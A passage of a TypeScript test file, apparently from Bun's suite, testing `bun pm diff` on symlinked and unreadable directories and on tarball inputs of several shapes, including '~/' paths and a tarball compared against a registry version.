      using dir = tempDir("pm-diff-links", {
        "a/index.js": "module.exports = 1;\n",
        "b/real/index.js": "module.exports = 2;\n",
        "c/index.js": "module.exports = 3;\n",
        "c/secret.js": "nope\n",
      });
      symlinkSync("real/index.js", join(String(dir), "b/index.js"));
      symlinkSync("..", join(String(dir), "b/loop"));
      symlinkSync("does-not-exist.js", join(String(dir), "b/dangling.js"));
      const run = async (args: string[]) => {
        await using p = Bun.spawn({
          cmd: [bunExe(), "pm", "diff", ...args, "--name-only"],
          cwd: String(dir),
          env: { ...bunEnv, NO_COLOR: "1" },
          stdout: "pipe",
          stderr: "pipe",
        });
        const [stdout, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
        return { stdout, stderr, exitCode };
      };
      const linked = await run(["./a", "./b"]);
      expect(linked.stdout.split("\n").filter(l => /^[AMD] /.test(l))).toEqual(["M index.js", "A real/index.js"]);
      expect(linked.exitCode).toBe(0);
      chmodSync(join(String(dir), "c/secret.js"), 0o000);
      try {
        const denied = await run(["./a", "./c"]);
        // root reads anything; everyone else must get a loud failure, not a diff with a hole in it.
        if (process.getuid?.() !== 0) {
          expect(denied.stderr).toContain("secret.js");
          expect(denied.exitCode).toBe(1);
        }
      } finally {
        chmodSync(join(String(dir), "c/secret.js"), 0o644);
      }
    },
  );

  test("tarball shapes: .tar, a root folder not called package/, ~/ paths, and `./x.tar 1.0.1`", async () => {
    using dir = tempDir("pm-diff-tars", {});
    // Build the archives with Bun itself so the test needs no system tar.
    await using mk = Bun.spawn({
      cmd: [
        bunExe(),
        "-e",
        `
        const v1 = { "weird-root-name/package.json": JSON.stringify({ name: "diffme", version: "1.0.0" }), "weird-root-name/index.js": "module.exports = 1;\\n" };
        await Bun.write("one.tar", await new Bun.Archive(v1).bytes());
        const v2 = { "package/package.json": JSON.stringify({ name: "diffme", version: "1.0.1" }), "package/index.js": "module.exports = 2;\\n" };
        await Bun.write("two.tgz", await new Bun.Archive(v2).bytes("gzip"));
        `,
      ],
      cwd: String(dir),
      env: bunEnv,
      stdout: "pipe",
      stderr: "pipe",
    });
    const [, mkErr, mkExit] = await Promise.all([mk.stdout.text(), mk.stderr.text(), mk.exited]);
    expect(mkErr).toBe("");
    expect(mkExit).toBe(0);
    const run = async (args: string[]) => {
      await using p = Bun.spawn({
        cmd: [bunExe(), "pm", "diff", ...args, "--name-only"],
        cwd: String(dir),
        env: {
          ...bunEnv,
          NO_COLOR: "1",
          HOME: String(dir),
          USERPROFILE: String(dir),
          NPM_CONFIG_REGISTRY: registry,
          BUN_CONFIG_REGISTRY: registry,
        },
        stdout: "pipe",
        stderr: "pipe",
      });
      const [stdout, stderr, exitCode] = await Promise.all([p.stdout.text(), p.stderr.text(), p.exited]);
      return { stdout, stderr, exitCode };
    };
    const tars = await run(["~/one.tar", "./two.tgz"]);
    expect(tars.stderr).toBe("");
    expect(tars.stdout.split("\n")[0]).toBe("~/one.tar → ./two.tgz");
    expect(tars.stdout.split("\n").filter(l => /^[AMD] /.test(l))).toEqual(["M index.js", "M package.json"]);
    expect(tars.exitCode).toBe(0);
    // A tarball plus a bare version means "this package, at that version, from the registry".
    const mixed = await run(["./one.tar", "2.0.0"]);
    expect(mixed.stderr).toBe("");
    expect(mixed.stdout.split("\n")[0]).toBe("./one.tar → diffme@2.0.0");
    expect(mixed.exitCode).toBe(0);
  });
});
